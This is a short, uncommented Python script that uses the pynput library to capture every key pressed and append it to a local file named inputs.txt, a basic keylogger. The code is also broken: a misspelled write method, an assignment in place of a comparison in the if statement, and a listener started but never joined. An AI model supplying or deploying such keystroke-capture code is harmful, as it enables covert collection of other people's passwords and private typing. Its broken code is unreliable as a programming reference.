from pynput import keyboard

def on_press(key):
    with open ('inputs.txt', 'a') as file:
        try:
            file.wright(f'{key.char}')
        except AttributeError:
            if key = key.enter:
                file.write("\n")
            else:
                file.write(f'{key}')
    
def on_release(key):
    pass
  
listener = keyboard.Listener(on_press=on_press, on_release=on_release)
listener.start()
